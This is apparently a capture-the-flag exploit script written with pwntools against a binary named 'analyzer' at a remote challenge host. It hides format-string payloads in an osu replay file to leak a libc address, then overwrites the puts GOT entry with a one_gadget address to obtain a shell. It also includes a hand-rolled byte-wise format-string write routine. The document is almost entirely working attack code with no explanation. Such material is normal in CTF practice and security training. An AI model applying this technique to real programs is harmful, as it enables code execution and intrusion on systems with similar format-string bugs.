from pwn import *
from icecream import ic

exe = ELF("./analyzer_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def formatthingy(base, f, g):
    payload = b''
    l = {}
    x = []
    z = []
    y = []
    for i in range(len(f)//8):
        x.append(hex(u64(f[i*8:8+(i*8)]))[2:].rjust(16, '0'))
        z.append(u64(g[i*8:8+(i*8)]))
    print(x)
    print(z)
    for j in range(len(x)):
        for i in range(8):
            if i == 0:
                l[z[j]+i] = int(x[j][-2-(i*2):], 16)
                y.append(int(x[j][-2-(i*2):], 16))
            else:
                l[z[j]+i] = int(x[j][-2-(i*2):-(i*2)], 16)
                y.append(int(x[j][-2-(i*2):-(i*2)], 16))
    t = []
    for i in range(len(y)):
        t.append(0)
    y.sort()

    for i in range(len(y)):
        if i == 0:
            if y[i] == 0:
                payload += "%0$hhn".format(y[i]).encode()
            else: 
                payload += "%{0}c%0$hhn".format(y[i]).encode()
        else:
            if y[i] == y[i-1]:
                payload += "%0$hhn".encode()
            else:
                payload += "%{0}c%0$hhn".format(y[i]-y[i-1]).encode()
    payload += b'a'*(8-(len(payload)%8))
    offset = (len(payload)//8)+base
    for i in range(2):
        payload = b''
        for i in range(len(y)):
            if i == 0:
                if y[i] == 0:
                    payload += "%{0}$hhn".format(offset).encode()
                    offset += 1
                else:
                    payload += "%{0}c%{1}$hhn".format(y[i], offset).encode()
                    offset += 1
            else:
                if y[i] == 0 or y[i] == y[i-1]:
                    payload += "%{0}$hhn".format(offset).encode()
                    offset += 1
                else:
                    payload += "%{0}c%{1}$hhn".format(y[i]-y[i-1], offset).encode()
                    offset += 1
        payload += b'a'*(8-(len(payload)%8))
        offset = (len(payload)//8)+base
    print(l)
    for i in range(len(y)):
        x = (list(l.keys())[list(l.values()).index(y[i])])
        payload += p64(x)
        l.pop(x)
    return payload

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chal.osugaming.lol", 7273)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''


'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

f = open("test.osr", "rb")
data = f.read()
data = binascii.hexlify(data[:0x2a] + b'%3$p'.ljust(100, b'a') + data[142:])
ru("analyzer):\n")


# print (data)

sl(data)
ru("er name: ")
leak = int(re(14).decode(), 16)
ic(hex(leak))
puts = 0x404020
libc_base = leak - 0x114887
ic(hex(libc_base))
oneshot = libc_base + 0xebc85
oneshots = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
ic(hex(puts))
ic(hex(oneshot))
payload = fmtstr_payload(14, {puts: oneshot})

f = open("test.osr", "rb")
data = f.read()
data = binascii.hexlify(data[:0x2a] + payload.ljust(100, b'a') + data[142:])
ru("analyzer):\n")
sl(data)
i()
